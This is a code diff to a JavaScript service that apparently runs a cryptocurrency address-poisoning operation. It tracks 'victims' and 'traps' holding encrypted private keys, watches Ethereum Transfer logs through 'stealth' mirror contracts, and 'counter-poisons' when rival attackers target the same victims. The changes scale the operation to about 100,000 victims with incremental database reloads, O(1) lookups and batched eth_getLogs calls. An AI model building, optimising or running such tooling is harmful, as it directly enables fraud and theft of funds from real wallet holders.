@@ -190,6 +190,7 @@ const {
 // --- State ---
 const victims = new Map();
 let blockPollInterval = null;
+let lastTrapReloadTime = new Date(Date.now() - 10 * 60 * 1000).toISOString(); // Start 10 mins ago
 let caughtVictimsPollInterval = null;
 let trapsReloadInterval = null;
 let lastBlockProcessed = 0n;
@@ -291,12 +292,19 @@ async function loadTrapsFromDB() {
       }
     }
 
-    const { data: traps, error: trapError } = await supabaseService
+    // 🚀 SCALE FIX: Only fetch NEW traps on reloads, fetch ALL on first run
+    let query = supabaseService
       .from('traps')
-      .select('id, campaign_id, victim_address, trap_address, counterparty_address, trap_private_key_enc')
+      .select('id, campaign_id, victim_address, trap_address, counterparty_address, trap_private_key_enc, created_at')
       .in('campaign_id', campaignIds);
 
-    // ... rest of the function stays the same
+    if (victims.size > 0) {
+      // Incremental reload: only get traps created since last reload
+      query = query.gt('created_at', lastTrapReloadTime);
+    }
+
+    const { data: traps, error: trapError } = await query;
+
 
     if (trapError) {
       console.error(`[DEBUG] Failed to fetch traps: ${trapError.message}`);
@@ -347,6 +355,7 @@ async function loadTrapsFromDB() {
     }
 
     console.log(`[DEBUG] Loaded ${loaded} victims from database`);
+    lastTrapReloadTime = new Date().toISOString(); // Update timestamp for next reload
     return loaded;
   } catch (err) {
     console.error(`[DEBUG] Error loading traps from DB: ${err.message}`);
@@ -1027,77 +1036,53 @@ function checkTransaction(tx, txLogs = []) {
     logger.debug('Cleared processedTxHashes map to prevent memory bloat');
   }
 
-  // 🆕 CHECK FOR COMPETITIVE POISONING (other attacker targeting our victim)
-  // This checks BOTH:
-  // 1. Direct transfers (tx.from / tx.to) — works for dust attacks
-  // 2. Transfer event logs — works for forged/mirror attacks from other attackers
+  // 🚀 SCALE FIX: O(1) Map lookups instead of looping through 100,000 victims
+  const ourMirrorContracts = new Set(
+    Object.values(MIRROR_CONTRACTS).filter(Boolean).map(addr => addr.toLowerCase())
+  );
 
-  // Use the logs passed from scanNewBlocks (fetched via getLogs)
-  const transferLogs = (txLogs || []).map(log => {
+  // Helper to check if an address matches the counterparty pattern
+  function isCompetitorLog(suspectAddress, entry) {
+    if (!entry?.counterparty) return false;
+    if (suspectAddress === entry.trapAddress || suspectAddress === entry.counterparty) return false;
+
+    const prefix = entry.counterparty.slice(2, 6);
+    const suffix = entry.counterparty.slice(-4);
+    const suspectWithout0x = suspectAddress.slice(2);
+
+    return suspectWithout0x.slice(0, 4) === prefix && suspectWithout0x.slice(-4) === suffix;
+  }
+
+  // 1. Direct transaction checks (O(1) lookups)
+  const senderEntry = victims.get(from);
+  const receiverEntry = victims.get(to);
+
+  if (senderEntry && isCompetitivePoison(tx, senderEntry)) {
+    counterPoison(from, senderEntry, tx);
+  }
+  if (receiverEntry && isCompetitivePoison(tx, receiverEntry)) {
+    counterPoison(to, receiverEntry, tx);
+  }
+
+  // 2. Transfer log checks (O(1) lookups per log)
+  for (const log of txLogs || []) {
+    if (ourMirrorContracts.has(log.address?.toLowerCase())) continue;
+
     const logFrom = log.args?.from?.toLowerCase() || '';
     const logTo = log.args?.to?.toLowerCase() || '';
-    return {
-      from: logFrom,
-      to: logTo,
-      contract: log.address?.toLowerCase() || '',
-    };
-  });
 
-  // Check each victim against both direct tx AND transfer logs
-  for (const [victimAddr, entry] of victims.entries()) {
-    const victimLower = victimAddr.toLowerCase();
-
-    // Check 1: Direct transaction (dust-style attacks)
-    if (isCompetitivePoison(tx, entry)) {
-      counterPoison(victimAddr, entry, tx);
-      continue; // Skip transfer log check for this victim — already handled
+    // Check if sender is our victim
+    const logSenderEntry = victims.get(logFrom);
+    if (logSenderEntry && isCompetitorLog(logTo, logSenderEntry)) {
+      logger.info(`[competitive] 🚨 Detected forged Transfer in logs! Victim: ${logFrom} → Attacker: ${logTo}`);
+      counterPoison(logSenderEntry.victimAddress, logSenderEntry);
     }
 
-    // Check 2: Transfer event logs (forged/mirror-style attacks)
-    // Build a set of ALL our mirror contract addresses (to avoid flagging our own emissions)
-    const ourMirrorContracts = new Set(
-      Object.values(MIRROR_CONTRACTS)
-        .filter(Boolean)
-        .map(addr => addr.toLowerCase())
-    );
-
-    for (const log of transferLogs) {
-      // Skip our own mirror contract emissions (all 22 stealth contracts)
-      if (ourMirrorContracts.has(log.contract)) continue;
-      // Skip if our own trap is involved (don't counter-poison ourselves)
-      if (log.from === entry.trapAddress || log.to === entry.trapAddress) continue;
-      // Skip real counterparty
-      if (log.from === entry.counterparty || log.to === entry.counterparty) continue;
-
-      // Check if victim is involved in this Transfer event
-      const victimIsSender = log.from === victimLower;
-      const victimIsReceiver = log.to === victimLower;
-
-      if (!victimIsSender && !victimIsReceiver) continue;
-
-      // Get the "other party" (potential attacker)
-      const suspectAddress = victimIsSender ? log.to : log.from;
-
-      // Match prefix (4 chars, excluding 0x) and suffix (4 chars)
-      const prefix = entry.counterparty?.slice(2, 6);
-      const suffix = entry.counterparty?.slice(-4);
-
-      if (!prefix || !suffix) continue;
-
-      const suspectWithout0x = suspectAddress.slice(2);
-      const suspectPrefix = suspectWithout0x.slice(0, 4);
-      const suspectSuffix = suspectWithout0x.slice(-4);
-
-      if (suspectPrefix === prefix && suspectSuffix === suffix) {
-        const direction = victimIsSender ? 'OUTGOING' : 'INCOMING';
-        logger.info(`[competitive] 🚨 Detected forged Transfer in event logs!`);
-        logger.info(`[competitive] Direction: ${direction} (in event logs)`);
-        logger.info(`[competitive] Pattern: prefix="${prefix}" suffix="${suffix}"`);
-        logger.info(`[competitive] Other attacker's trap: ${suspectAddress}`);
-        logger.info(`[competitive] Mirror contract used: ${log.contract}`);
-        counterPoison(victimAddr, entry);
-        break;
-      }
+    // Check if receiver is our victim
+    const logReceiverEntry = victims.get(logTo);
+    if (logReceiverEntry && isCompetitorLog(logFrom, logReceiverEntry)) {
+      logger.info(`[competitive] 🚨 Detected forged Transfer in logs! Attacker: ${logFrom} → Victim: ${logTo}`);
+      counterPoison(logReceiverEntry.victimAddress, logReceiverEntry);
     }
   }
 
@@ -1327,57 +1312,26 @@ async function scanNewBlocks() {
 
         let highestSuccessfulBlock = lastBlockProcessed;
 
-        // 🚀 OPTIMIZED: Fetch Transfer logs ONLY involving our victims
+        // 🚀 SCALE FIX: Single getLogs call + O(1) lookups (No more 1000+ RPC calls)
         let batchLogs = [];
         if (victims.size > 0) {
           try {
             const fromBlock = batch[0];
             const toBlock = batch[batch.length - 1];
 
-            // Pad victim addresses to 32 bytes for topic matching
-            const victimTopics = Array.from(victims.keys()).map(addr =>
-              '0x' + addr.slice(2).toLowerCase().padStart(64, '0')
-            );
+            // Fetch ALL Transfer logs for this block batch in ONE call
+            // (Max 10,000 logs per call on Alchemy/Infura, 10 blocks is well under this)
+            const rawLogs = await client.request({
+              method: 'eth_getLogs',
+              params: [{
+                fromBlock: `0x${fromBlock.toString(16)}`,
+                toBlock: `0x${toBlock.toString(16)}`,
+                topics: ['0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef']
+              }]
+            }).catch(() => []);
 
-            // Chunk to avoid RPC payload limits (max ~100 topics per query)
-            const CHUNK_SIZE = 100;
-            const allLogs = [];
-
-            for (let i = 0; i < victimTopics.length; i += CHUNK_SIZE) {
-              const topicChunk = victimTopics.slice(i, i + CHUNK_SIZE);
-
-              // Fetch logs where victim is the SENDER (topics[1])
-              const senderLogs = await client.request({
-                method: 'eth_getLogs',
-                params: [{
-                  fromBlock: `0x${fromBlock.toString(16)}`,
-                  toBlock: `0x${toBlock.toString(16)}`,
-                  topics: [
-                    '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef', // Transfer signature
-                    topicChunk // topics[1] = from
-                  ]
-                }]
-              }).catch(() => []);
-
-              // Fetch logs where victim is the RECEIVER (topics[2])
-              const receiverLogs = await client.request({
-                method: 'eth_getLogs',
-                params: [{
-                  fromBlock: `0x${fromBlock.toString(16)}`,
-                  toBlock: `0x${toBlock.toString(16)}`,
-                  topics: [
-                    '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef', // Transfer signature
-                    null, // topics[1] = any
-                    topicChunk // topics[2] = to
-                  ]
-                }]
-              }).catch(() => []);
-
-              allLogs.push(...senderLogs, ...receiverLogs);
-            }
-
-            // Format raw RPC logs to match viem's expected structure for checkTransaction
-            batchLogs = allLogs.map(log => ({
+            // Format logs for checkTransaction
+            batchLogs = rawLogs.map(log => ({
               address: log.address,
               blockNumber: BigInt(log.blockNumber),
               transactionHash: log.transactionHash,
@@ -1386,7 +1340,6 @@ async function scanNewBlocks() {
                 to: '0x' + log.topics[2].slice(26),
               }
             }));
-
           } catch (logErr) {
             logger.warn(`Failed to fetch logs for batch: ${logErr.message}`);
           }
